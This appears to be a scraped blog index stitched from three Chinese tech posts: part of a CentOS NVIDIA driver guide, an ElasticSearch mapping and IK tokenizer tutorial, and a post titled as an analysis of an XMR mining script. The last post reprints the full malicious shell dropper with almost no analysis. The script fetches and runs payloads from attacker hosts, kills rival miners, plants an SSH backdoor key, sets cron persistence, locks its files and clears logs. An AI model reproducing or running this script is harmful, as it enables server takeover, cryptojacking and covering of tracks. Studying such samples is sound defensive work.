systemctl set-default graphical.target# 重启系统# reboot# 重启完成后，若成功进入GNOME的桌面环境，执行此命令可以调出图形界面来配置显卡（可选操作）# nvidia-settings 卸载 NVIDIA 显卡驱动（可选操作） 如果显卡驱动安装和系统重启完成后，无法正常进入 GHOME 的桌面环境，此时可以在另一台机器上通过远程 SSH 使用 root 用户登录进系统，然后手动执行以下命令卸载 NVIDIA 的显卡驱动程序（在纯文本模式下）。特别注意：当 NVIDIA 的显卡驱动被卸载后，需要启用系统自带的 Nouveau 显卡驱动 和 还原 initramfs image，否则系统会因缺少显卡驱动而无法正常显示。 1# ./NVIDIA-Linux-x86_64-430.40.run --uninstall 系统内核更新问题 如果系统更新内核并重启后，显示器无法显示 GNOME 桌面环境（一般是因为显卡驱动丢失导致显示器无法显示桌面环境，但大多数情况下 Centos 系统已经启动成功），此时可以在另一台机器上通过 SSH 远程登录进旧的 Centos 系统，然后按照上面的步骤重新安装 NVIDIA 的显卡驱动（如果安装程序提示显卡驱动已存在，手动卸载显卡驱动后，再重新安装即可）。 主板启用独立显卡 一般的桌面主板（家用）可以自动检测到独立显卡并启用，但是部分主板（例如服务器主板），则需要在 BIOS 里将板载显卡或者 CPU 的核显屏蔽掉，个别品牌可能需要通过主板跳线的方式屏蔽板载显卡或者 CPU 的核显。超微的服务器主板一般需要在 BIOS 里设置板载显卡的屏蔽，否则独立显卡无法正常识别。启用独立显卡之后，超微的部分服务器主板在系统刚启动的时候，显示器不会显示任何内容（黑屏 + 无信号输出）；因为服务器主板开机自检的耗时较长，此时一般需要耐心等待几十秒甚至更久，显示器才会显示硬件自检和系统启动相关的信息。 补充说明 一般情况下，只要 Centos 系统可以正常识别到 NVIDIA 的显卡，同时显示器与 NVIDIA 的显卡正确连接上；那么即使不安装 NVIDIA 的显卡驱动程序，在系统启动的时候，显示器都可以正常显示硬件自检和系统启动相关的信息（可能会延时显示）；唯一的问题是在系统正常启动完成后，显示器没办法显示 GNOME 桌面环境。 nvidia-smi 命令输出的信息 参考资料 关于 Centos 安装显卡驱动 Centos7.0 安装 NVIDIA 驱动 Centos7.3 安装 NVIDIA-1080TI 驱动、cuda、cudnn、TensorFlow var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"ElasticSearch 入门教程 - 基础篇之三",url:"/posts/a215b192.html",text:'大纲 ElasticSearch 入门教程 - 基础篇之一 ElasticSearch 入门教程 - 基础篇之二 ElasticSearch 入门教程 - 基础篇之三 版本说明 软件 版本 描述 ElasticSearch 7.4.2 ElasticSearch 的版本 Curl 7.29.0 Curl 的版本 MappingMapping 简介Mapping 是用来定义文档（Document），以及它所包含的字段（Field）是如何存储和检索的，这类似创建 MySQL 数据库表时指定表的字段类型，主要作用如下： 定义 Index 下的字段名 定义字段类型，比如数值型、浮点型、布尔型等 定义倒排索引相关的设置，比如是否索引、记录 Position 等 一句话简单概括就是，Mapping 决定了 ES 在建立倒排索引和进行检索时对文档采取的相关策略，如数字类型、日期类型、文本类型等等。 值得一提的是，检索时用到的分析策略，要和建立索引时的分析策略相同，否则将导致数据分析不准确。ES 对不同的类型有不同的存储和检索策略，例如： Exact Value - 精确匹配：对 Exact Value（如 date），在索引的分词阶段，会将整个 Value 作为一个关键词建立到倒排索引中。 Full Text - 全文检索：对于 Full Text 型的数据类型（如 text），在索引时会经过各类处理，包括分词、Normalization（时态转换、单复数的转换、同义词转换、大小写转换、缩写）等，才会建立到索引数据中，更深入的话就涉及到 NPL 自然语义处理。 Mapping Type每个索引都拥有唯一的&nbsp;Mapping Type，用来决定文档将如何被索引。Mapping Type 由下面两部分组成： Meta fields：元字段，用于自定义如何处理文档的相关元数据。元字段包括文档的 _index、_type、_id 和 _source 等字段。 Fields or properties：映射类型，包含与文档相关的字段或属性的列表。 特别注意 从 ES 6.0.0 及以上的版本开始，Mapping Type 已经被官方移除。 常用字段类型提示 ES 完整的字段类型说明请查看 官方文档。 核心字段类型 布尔类型：boolean 二进制类型：binary 日期类型：date、date_nanos 字符串型：text、keyword（精确匹配，不会进行分词） 数字类型：long、integer、short、byte、double、float、half_float、scaled_float 范围类型：integer_range、float_range、long_range、double_range、date_range 复合字段类型 数组类型：array（支持不针对特定的类型） 对象类型：object（用于单个 JSON 对象） 嵌套类型：nested（用于 JSON 对象数组） 地理位置类型：geo_point（用于描述地理坐标，如经纬度）、geo_shape（用于描述复杂形状，如地理图形） 专用字段类型 IP 类型：ip（记录 IPV4 和 IPV6 地址） 哈希类型：murmur3（记录字符串的 Hash 值） 补全类型：completion（提供自动补全的提示） 令牌计数类型：token_count（用于统计字符串中的词条数量） 抽取类型：percolator（接受特定领域查询语言 - Query DSL 的查询） 附件类型：attachment（支持存储附件，如 Microsoft Office、Open Document、ePub、HTML 等格式的内容） 多字段的特性通常用于为不同的目的用不同的方法索引同一个字段，这样可以更好地满足各种搜索需求。例如一个字符串类型的字段可以设置为 text 来支持全文检索，与此同时也可以让这个字段拥有 keyword 类型来做排序和聚合。大多数的字段类型，都是通过 fields 参数来支持多字段的特性。 数据类型自动猜测以下的 JSON 数据类型，ES 会自动猜测其字段类型。对于其他 ES 不会自动猜测的数据类型，则需要手动通过 Mapping 来指定其字段类型。 JSON Type JSON Value ES Type 布尔型 true、false boolean 整数 123 long 浮点数 123.45 double 日期 2020-09-15 date 字符串 foo string Mapping 操作版本兼容说明 ES 6 及以下版本拥有 type 的概念 ES 7 及以上版本移除了 type 的概念 关系型数据库中两个数据库表是互相独立的，即使它们里面有相同名称的列也不影响使用，但在 ES 中不是这样的。ES 是基于 Lucene 开发的搜索引擎，而 ES 中不同 type 下名称相同的 filed 最终在 Lucene 中的处理方式是一样的。 比如两个不同 type 下的两个 user_name，在 ES 同一个索引下其实被认为是同一个 filed，必须在两个不同的 type 中定义相同的 filed 映射。否则，不同 type 中的相同字段名称就会在处理中出现冲突的情况，导致 Lucene 处理效率下降。ES 去掉 type 的支持，就是为了提高处理数据的效率。 在 ES 7.x 版本里，URL 中的 type 参数为可选项，也就是索引一个文档时不再要求提供文档类型。而在 ES 8.x 版本里，不再支持 URL 中的 type 参数。ES 不同版本的兼容方案如下： 1）将索引从多类型迁移到单类型，即每种类型文档都建一个独立的索引。 2）将已存在的索引下的类型数据，全部迁移到指定位置。 查询 Mapping 查询 bank 索引下的映射 1curl -X GET http://127.0.0.1:9200/bank/_mapping 返回的 JSON 结果 123456789101112131415161718192021222324252627{ "bank": { "mappings": { "properties": { "account_number": { "type": "long" }, "address": { "type": "text", "fields": { "keyword": { "type": "keyword", "ignore_above": 256 } } }, "age": { "type": "long" }, "balance": { "type": "long" }, ...... } } }} 创建 Mapping 创建索引并指定映射，这里的 URL 不需要带 _mapping 12345678910111213141516PUT /user{ "mappings": { "properties": { "age": { "type": "integer" }, "email": { "type": "keyword" }, "name": { "type": "text" } } }} 若希望新增数据，可以使用以下方式，其中的 _doc 是类型（固定不变的） 123456POST /user/_doc/1{ "age ": 18, "email": "233443@qq.com", "name": "Jim"} 新增 Mapping 添加新的字段映射 12345678910PUT /user/_mapping{ "properties": { "employee-id": { "type": "keyword", "index": false, "doc_values": false } }} 属性 可选 说明 index 是 默认 true，如果为 false，表示该字段不会被索引，也就是在检索结果里面会出现，但字段本身并不能当做检索条件。 doc_values 是 默认 true，如果为 false，表示该字段不可以做排序、聚合以及脚本操作，这样更节省磁盘空间。还可以通过设定 doc_values 为 true，index 为 false 来让字段不能被搜索，但可以用于排序、聚合以及脚本操作。 更新 Mapping对于已经存在的映射字段，ES 不支持更新，这是因为 Lucence 实现的倒排索引生成后不允许修改。映射字段的更新，必须先创建新的索引，然后进行数据迁移。 特别注意 由于从 ES 7 及以上版本开始，Type 的概念已经被官方移除，因此 ES 6 及以下版本在迁移数据时，需要指定 Type，而其他版本则不需要指定 Type。 先创建新的索引，并指定新的映射 12345678910111213141516PUT /new_user{ "mappings": { "properties": { "age": { "type": "integer" }, "email": { "type": "text" }, "name": { "type": "keyword" } } }} 将旧索引下的数据进行迁移，以下是 ES 7 及以上版本的写法，其中的 source 用于指定旧索引，dest 用于指定新索引 123456789POST /_reindex{ "source": { "index": "user" }, "dest": { "index": "new_user" }} 将旧索引下的数据进行迁移，以下是 ES 6 及以下版本的写法，必须指定 type，其中的 source 用于指定旧索引，dest 用于指定新索引 12345678910POST /_reindex{ "source": { "index": "user", "type": "vip" }, "dest": { "index": "new_user" }} 分词一个 Tokenizer（分词器）接收一个字符流，将之分割为独立的 Tokens（词元，通常是独立的单词），然后输出 Tokens 流。例如，Whitespace Tokenizer 遇到空白字符时分割文本。它会将文本 Quick brown fox! 分割为 [Quick， brown， fox!]。 该 Tokenizer（分词器）还负责记录各个 Term（词条）的顺序或 Position 位置（用于 Phrase 短语和 Word Proximity 词近邻查询），以及 Term（词条）所代表的原始 Word（单词）的 Start（起始）和 End（结束）的 Character Offsets（字符偏移量，用于高亮显示搜索的内容）。Elasticsearch 提供了很多内置的分词器，可以用来构建 Custom Analyzers（自定义分词器）。 IK 分词器简介IKAnalyzer 是一个开源的，基于 Java 语言开发的轻量级的中文分词工具包。从 2006 年 12 月推出 1.0 版开始，IKAnalyzer 已经推出了 3 个大版本。最初，它是以开源项目 Lucene 为应用主体的，结合词典分词和文法分析算法的中文分词组件。新版本的 IKAnalyzer 3.0 则发展为 面向 Java 的公用分词组件，独立于 Lucene 项目，同时提供了对 Lucene 的默认优化实现。 安装 IK 分词器可以从 GitHub 仓库 下载 IK 分词器的安装包，然后按照以下步骤安装即可。值得一提的是，IK 分词器的版本号必须与 ES 的版本号一致。 安装 IK 分词器 12345678910111213141516# 进入 ES 的 plugins 目录$ cd /usr/local/elasticsearch/plugins# 下载文件$ wget https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v7.4.2/elasticsearch-analysis-ik-7.4.2.zip# 解压文件$ unzip -d ik elasticsearch-analysis-ik-7.4.2.zip# 删除文件$ rm -rf elasticsearch-analysis-ik-7.4.2.zip# 文件授权$ chmod -R 777 ik# 重启 ES 服务器 查看 IK 分词器是否安装成功 1234567# 进入 ES 的 bin 目录$ cd /usr/local/elasticsearch/bin# 查看插件列表$ elasticsearch-plugin list# 如果看到 IK 分词器出现在插件列表中，则说明安装成功 测试 IK 分词器观察下述的结果，能够看出来使用不同的分词器，分词结果有明显的区别，所以以后定义一个索引不能再使用默认的 Mapping 了，要手动建立 Mapping，因为要选择合适的分词器。 提示 IK 分词器，提供了两种颗粒度拆分（ik_smart，ik_max_word） ik_smart（最粗粒度拆分），分割的粒度较小 ik_max_word（最细粒度划分），分割的力度较大 使用默认的分词器，无法对中文进行正确分词 1234POST /_analyze{ "text": "我是中国人"} 123456789101112131415161718192021222324252627282930313233343536373839{ "tokens" : [ { "token" : "我", "start_offset" : 0, "end_offset" : 1, "type" : "&lt;IDEOGRAPHIC&gt;", "position" : 0 }, { "token" : "是", "start_offset" : 1, "end_offset" : 2, "type" : "&lt;IDEOGRAPHIC&gt;", "position" : 1 }, { "token" : "中", "start_offset" : 2, "end_offset" : 3, "type" : "&lt;IDEOGRAPHIC&gt;", "position" : 2 }, { "token" : "国", "start_offset" : 3, "end_offset" : 4, "type" : "&lt;IDEOGRAPHIC&gt;", "position" : 3 }, { "token" : "人", "start_offset" : 4, "end_offset" : 5, "type" : "&lt;IDEOGRAPHIC&gt;", "position" : 4 } ]} 使用 ik_smart 分词器，可以对中文进行正确分词 12345POST /_analyze{ "analyzer": "ik_smart", "text": "我是中国人"} 12345678910111213141516171819202122232425{ "tokens" : [ { "token" : "我", "start_offset" : 0, "end_offset" : 1, "type" : "CN_CHAR", "position" : 0 }, { "token" : "是", "start_offset" : 1, "end_offset" : 2, "type" : "CN_CHAR", "position" : 1 }, { "token" : "中国人", "start_offset" : 2, "end_offset" : 5, "type" : "CN_WORD", "position" : 2 } ]} 使用 ik_max_word 分词器，可以对中文进行正确分词 12345POST /_analyze{ "analyzer": "ik_max_word", "text": "我是中国人"} 123456789101112131415161718192021222324252627282930313233343536373839{ "tokens" : [ { "token" : "我", "start_offset" : 0, "end_offset" : 1, "type" : "CN_CHAR", "position" : 0 }, { "token" : "是", "start_offset" : 1, "end_offset" : 2, "type" : "CN_CHAR", "position" : 1 }, { "token" : "中国人", "start_offset" : 2, "end_offset" : 5, "type" : "CN_WORD", "position" : 2 }, { "token" : "中国", "start_offset" : 2, "end_offset" : 4, "type" : "CN_WORD", "position" : 3 }, { "token" : "国人", "start_offset" : 3, "end_offset" : 5, "type" : "CN_WORD", "position" : 4 } ]} 自定义词库IK 分词器自身不能识别最新的网络流行语，但可以通过自定义词库来解决。 第一步：更改 IK 分词器的配置文件 IKAnalyzer.cfg.xml，配置文件在 ES 的 plugins 目录下，例如 /usr/local/elasticsearch/plugins/ik/config/IKAnalyzer.cfg.xml 12345678910111213&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd"&gt;&lt;properties&gt; &lt;comment&gt;IK Analyzer 扩展配置&lt;/comment&gt; &lt;!--用户可以在这里配置自己的扩展字典 --&gt; &lt;entry key="ext_dict"&gt;&lt;/entry&gt; &lt;!--用户可以在这里配置自己的扩展停止词字典--&gt; &lt;entry key="ext_stopwords"&gt;&lt;/entry&gt; &lt;!--用户可以在这里配置远程扩展字典 --&gt; &lt;entry key="remote_ext_dict"&gt;http://192.168.1.103/es/fenci.txt&lt;/entry&gt; &lt;!--用户可以在这里配置远程扩展停止词字典--&gt; &lt;!-- &lt;entry key="remote_ext_stopwords"&gt;words_location&lt;/entry&gt; --&gt;&lt;/properties&gt; 提示 remote_ext_dict 参数用于指定远程扩展字典所在的网络位置（URL）。值得一提的是，这里可以将远程扩展字典通过文件的方式（一行一个分词）存放在 Nginx 服务器，也可以自行开发 HTTP 接口并返回扩展字典的内容。 远程扩展字典默认支持热更新，要求 Http 请求需要返回两个头部（header），一个是 Last-Modified，一个是 ETag，这两者都是字符串类型，只要有一个发生变化，IK 插件就会去自动抓取新的字典进而更新词库。 更改完 IK 分词器的配置文件后，必须重启 ES 服务器，否则远程扩展字典无法生效。 第二步：重启 ES 服务器 第三步：上述配置完成之后，ES 只会对新增的数据用新词分词，历史数据是不会重新分词的。如果希望历史数据重新分词，需要执行以下的 HTTP 请求： 1curl -X POST my_index/_update_by_query?conflicts=proceed 参考资料 ElasticSearch - Mapping 详解 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"分布式"},{title:"XMR 恶意挖矿脚本分析",url:"/posts/8f0349b3.html",text:'XMR 恶意挖矿脚本样本源码一 记录于 2019-07-26，攻击者将挖矿脚本的下载与执行命令写入到 Redis 服务器中，具体内容如下： 1"*/1 * * * * curl -fsSL http://185.18.105.23/E5DB0E07C3D7BE80V520/init.sh |sh" 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461#!/bin/shsetenforce 0 2&gt;dev/nullecho SELINUX=disabled &gt; /etc/sysconfig/selinux 2&gt;/dev/nullsync &amp;&amp; echo 3 &gt;/proc/sys/vm/drop_cachescrondir=\'/var/spool/cron/\'"$USER"cont=`cat ${crondir}`ssht=`cat /root/.ssh/authorized_keys`echo 1 &gt; /etc/sysupdatesrtdir="/etc/sysupdates"bbdir="/usr/bin/curl"bbdira="/usr/bin/cur"ccdir="/usr/bin/wget"ccdira="/usr/bin/wge"mv /usr/bin/wget /usr/bin/getmv /usr/bin/xget /usr/bin/getmv /usr/bin/get /usr/bin/wgemv /usr/bin/curl /usr/bin/urlmv /usr/bin/xurl /usr/bin/urlmv /usr/bin/url /usr/bin/curminer_url="https://de.gsearch.com.de/api/sysupdate"miner_url_backup="http://185.18.105.23/E5DB0E07C3D7BE80V520/sysupdate"miner_size="854364"sh_url="https://de.gsearch.com.de/api/update.sh"sh_url_backup="http://185.18.105.23/E5DB0E07C3D7BE80V520/update.sh"config_url="https://de.gsearch.com.de/api/config.json"config_url_backup="http://185.18.105.23/E5DB0E07C3D7BE80V520/config.json"config_size="4954"scan_url="https://de.gsearch.com.de/api/networkservice"scan_url_backup="http://185.18.105.23/E5DB0E07C3D7BE80V520/networkservice"scan_size="2584072"watchdog_url="https://de.gsearch.com.de/api/sysguard"watchdog_url_backup="http://185.18.105.23/E5DB0E07C3D7BE80V520/sysguard"watchdog_size="1929480"kill_miner_proc(){ ps auxf|grep -v grep|grep "mine.moneropool.com"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "pool.t00ls.ru"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "monerohash.com"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "xmrpool.eu" | awk \'{print $2}\'|xargs kill -9 ps auxf|grep xiaoyao| awk \'{print $2}\'|xargs kill -9 ps auxf|grep xiaoxue| awk \'{print $2}\'|xargs kill -9 ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\\-c"|xargs kill -9 ps ax|grep -o \'./[0-9]* -c\'| xargs pkill -f pkill -f biosetjenkins pkill -f Loopback pkill -f apaceha pkill -f cryptonight pkill -f stratum pkill -f mixnerdx pkill -f performedl pkill -f JnKihGjn pkill -f irqba2anc1 pkill -f irqba5xnc1 pkill -f irqbnc1 pkill -f ir29xc1 pkill -f conns pkill -f irqbalance pkill -f crypto-pool pkill -f minexmr pkill -f XJnRj pkill -f mgwsl pkill -f pythno pkill -f jweri pkill -f lx26 pkill -f NXLAi pkill -f BI5zj pkill -f askdljlqw pkill -f minerd pkill -f minergate pkill -f Guard.sh pkill -f ysaydh pkill -f bonns pkill -f donns pkill -f kxjd pkill -f Duck.sh pkill -f bonn.sh pkill -f conn.sh pkill -f kworker34 pkill -f kw.sh pkill -f pro.sh pkill -f polkitd pkill -f acpid pkill -f icb5o pkill -f nopxi pkill -f irqbalanc1 pkill -f minerd pkill -f i586 pkill -f gddr pkill -f mstxmr pkill -f ddg.2011 pkill -f wnTKYg pkill -f deamon pkill -f disk_genius pkill -f sourplum pkill -f polkitd pkill -f nanoWatch pkill -f zigw pkill -f devtool pkill -f systemctI pkill -f WmiPrwSe pkill -f sysguard pkill -f sysupdate pkill -f networkservice crontab -r rm -rf /var/spool/cron/*}downloads(){ if [ -f "/usr/bin/curl" ] then echo $1,$2 http_code=`curl -I -m 10 -o /dev/null -s -w %{http_code} $1` if [ "$http_code" -eq "200" ] then curl --connect-timeout 10 --retry 100 $1 &gt; $2 elif [ "$http_code" -eq "405" ] then curl --connect-timeout 10 --retry 100 $1 &gt; $2 else curl --connect-timeout 10 --retry 100 $3 &gt; $2 fi elif [ -f "/usr/bin/cur" ] then http_code = `cur -I -m 10 -o /dev/null -s -w %{http_code} $1` if [ "$http_code" -eq "200" ] then cur --connect-timeout 10 --retry 100 $1 &gt; $2 elif [ "$http_code" -eq "405" ] then cur --connect-timeout 10 --retry 100 $1 &gt; $2 else cur --connect-timeout 10 --retry 100 $3 &gt; $2 fi elif [ -f "/usr/bin/wget" ] then wget --timeout=10 --tries=100 -O $2 $1 if [ $? -ne 0 ] then wget --timeout=10 --tries=100 -O $2 $3 fi elif [ -f "/usr/bin/wge" ] then wge --timeout=10 --tries=100 -O $2 $1 if [ $? -eq 0 ] then wge --timeout=10 --tries=100 -O $2 $3 fi fi}kill_sus_proc(){ ps axf -o "pid"|while read procid do ls -l /proc/$procid/exe | grep /tmp if [ $? -ne 1 ] then cat /proc/$procid/cmdline| grep -a -E "sysguard|update.sh|sysupdate|networkservice" if [ $? -ne 0 ] then kill -9 $procid else echo "don\'t kill" fi fi done ps axf -o "pid %cpu" | awk \'{if($2&gt;=40.0) print $1}\' | while read procid do cat /proc/$procid/cmdline| grep -a -E "sysguard|update.sh|sysupdate|networkservice" if [ $? -ne 0 ] then kill -9 $procid else echo "don\'t kill" fi done}kill_miner_prockill_sus_procif [ -f "$rtdir" ]then echo "i am root" echo "goto 1" &gt;&gt; /etc/sysupdate chattr -i /etc/sysupdate* chattr -i /etc/config.json* chattr -i /etc/update.sh* chattr -i /root/.ssh/authorized_keys* chattr -i /etc/networkservice if [ ! -f "/usr/bin/crontab" ] then echo "*/30 * * * * sh /etc/update.sh &gt;/dev/null 2&gt;&amp;1" &gt;&gt; ${crondir} else [[ $cont =~ "update.sh" ]] || (crontab -l ; echo "*/30 * * * * sh /etc/update.sh &gt;/dev/null 2&gt;&amp;1") | crontab - fi chmod 700 /root/.ssh/ echo &gt;&gt; /root/.ssh/authorized_keys chmod 600 root/.ssh/authorized_keys echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9WKiJ7yQ6HcafmwzDMv1RKxPdJI/oeXUWDNW1MrWiQNvKeSeSSdZ6NaYVqfSJgXUSgiQbktTo8Fhv43R9FWDvVhSrwPoFBz9SAfgO06jc0M2kGVNS9J2sLJdUB9u1KxY5IOzqG4QTgZ6LP2UUWLG7TGMpkbK7z6G8HAZx7u3l5+Vc82dKtI0zb/ohYSBb7pK/2QFeVa22L+4IDrEXmlv3mOvyH5DwCh3HcHjtDPrAhFqGVyFZBsRZbQVlrPmwqXH2bOLc1PMrK1oG8dyk8gY8m4iZfr9ZDGxs4gAqdWtBQNIN8cvz4SI+Jv9fvayMH7f+Kl2yXiHN5oD9BVTkdIWX root@u17" &gt;&gt; /root/.ssh/authorized_keys cfg="/etc/config.json" file="/etc/sysupdate" if [-f "/etc/config.json" ] then filesize_config=`ls -l /etc/config.json | awk \'{ print $5 }\'` if [ "$filesize_config" -ne "$config_size" ] then pkill -f sysupdate rm /etc/config.json downloads $config_url /etc/config.json $config_url_backup else echo "no need download" fi else downloads $config_url /etc/config.json $config_url_backup fi if [ -f "/etc/sysupdate" ] then filesize1=`ls -l /etc/sysupdate | awk \'{ print $5 }\'` if [ "$filesize1" -ne "$miner_size" ] then pkill -f sysupdate rm /etc/sysupdate downloads $miner_url /etc/sysupdate $miner_url_backup else echo "not need download" fi else downloads $miner_url /etc/sysupdate $miner_url_backup fi if [ -f "/etc/sysguard" ] then filesize1=`ls -l /etc/sysguard | awk \'{ print $5 }\'` if [ "$filesize1" -ne "$watchdog_size" ] then pkill -f sysguard rm /etc/sysguard downloads $watchdog_url /etc/sysguard $watchdog_url_backup else echo "not need download" fi else downloads $watchdog_url /etc/sysguard $watchdog_url_backup fi downloads $sh_url /etc/update.sh $sh_url_backup if [ -f "/etc/networkservice" ] then filesize2=`ls -l /etc/networkservice | awk \'{ print $5 }\'` if [ "$filesize2" -ne "$scan_size" ] then pkill -f networkservice rm /etc/networkservice downloads $scan_url /etc/networkservice $scan_url_backup else echo "not need download" fi else downloads $scan_url /etc/networkservice $scan_url_backup fi chmod 777 /etc/sysupdate ps -fe|grep sysupdate |grep -v grep if [ $? -ne 0 ] then cd /etc echo "not root runing" sleep 5s ./sysupdate &amp; else echo "root runing....." fi chmod 777 /etc/networkservice ps -fe|grep networkservice |grep -v grep if [ $? -ne 0 ] then cd /etc echo "not roots runing" sleep 5s ./networkservice &amp; else echo "roots runing....." fi chmod 777 /etc/sysguard ps -fe|grep sysguard |grep -v grep if [ $? -ne 0 ] then echo "not tmps runing" cd /etc chmod 777 sysguard sleep 5s ./sysguard &amp; else echo "roots runing....." fi chmod 777 /etc/sysupdate chattr +i /etc/sysupdate chmod 777 /etc/networkservice chattr +i /etc/networkservice chmod 777 /etc/config.json chattr +i /etc/config.json chmod 777 /etc/update.sh chattr +i /etc/update.sh chmod 777 /root/.ssh/authorized_keys chattr +i /root/.ssh/authorized_keyselse echo "goto 1" &gt; /tmp/sysupdates chattr -i /tmp/sysupdate* chattr -i /tmp/networkservice chattr -i /tmp/config.json* chattr -i /tmp/update.sh* if [ ! -f "/usr/bin/crontab" ] then echo "*/30 * * * * sh /tmp/update.sh &gt;/dev/null 2&gt;&amp;1" &gt;&gt; ${crondir} else [[ $cont =~ "update.sh" ]] || (crontab -l ; echo "*/30 * * * * sh /tmp/update.sh &gt;/dev/null 2&gt;&amp;1") | crontab - fi if [ -f "/tmp/config.json" ] then filesize1=`ls -l /tmp/config.json | awk \'{ print $5 }\'` if [ "$filesize1" -ne "$config_size" ] then pkill -f sysupdate rm /tmp/config.json downloads $config_url /tmp/config.json $config_url_backup else echo "no need download" fi else downloads $config_url /tmp/config.json $config_url_backup fi if [ -f "/tmp/sysupdate" ] then filesize1=`ls -l /tmp/sysupdate | awk \'{ print $5 }\'` if [ "$filesize1" -ne "$miner_size" ] then pkill -f sysupdate rm /tmp/sysupdate downloads $miner_url /tmp/sysupdate $miner_url_backup else echo "no need download" fi else downloads $miner_url /tmp/sysupdate $miner_url_backup fi if [ -f "/tmp/sysguard" ] then filesize1=`ls -l /tmp/sysguard | awk \'{ print $5 }\'` if [ "$filesize1" -ne "$watchdog_size" ] then pkill -f sysguard rm /tmp/sysguard downloads $watchdog_url /tmp/sysguard $watchdog_url_backup else echo "not need download" fi else downloads $watchdog_url /tmp/sysguard $watchdog_url_backup fi echo "i am here" downloads $sh_url /tmp/update.sh $sh_url_backup if [ -f "/tmp/networkservice" ] then filesize2=`ls -l /tmp/networkservice | awk \'{ print $5 }\'` if [ "$filesize2" -ne "$scan_size" ] then pkill -f networkservice rm /tmp/networkservice downloads $scan_url /tmp/networkservice $scan_url_backup else echo "no need download" fi else downloads $scan_url /tmp/networkservice $scan_url_backup fi ps -fe|grep sysupdate |grep -v grep if [ $? -ne 0 ] then echo "not tmp runing" cd /tmp chmod 777 sysupdate sleep 5s ./sysupdate &amp; else echo "tmp runing....." fi ps -fe|grep networkservice |grep -v grep if [ $? -ne 0 ] then echo "not tmps runing" cd /tmp chmod 777 networkservice sleep 5s ./networkservice &amp; else echo "tmps runing....." fi ps -fe|grep sysguard |grep -v grep if [ $? -ne 0 ] then echo "not tmps runing" cd /tmp chmod 777 sysguard sleep 5s ./sysguard &amp; else echo "tmps runing....." fi chmod 777 /tmp/sysupdate chattr +i /tmp/sysupdate chmod 777 /tmp/networkservice chattr +i /tmp/networkservice chmod 777 /tmp/sysguard chattr +i /tmp/sysguard chmod 777 /tmp/update.sh chattr +i /tmp/update.sh chmod 777 /tmp/config.json chattr +i /tmp/config.jsonfiiptables -Fiptables -Xiptables -A OUTPUT -p tcp --dport 3333 -j DROPiptables -A OUTPUT -p tcp --dport 5555 -j DROPiptables -A OUTPUT -p tcp --dport 7777 -j DROPiptables -A OUTPUT -p tcp --dport 9999 -j DROPiptables -I INPUT -s 43.245.222.57 -j DROPservice iptables reloadps auxf|grep -v grep|grep "stratum"|awk \'{print $2}\'|xargs kill -9history -cecho &gt; /var/spool/mail/rootecho &gt; /var/log/wtmpecho &gt; /var/log/secureecho &gt; /root/.bash_history var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": 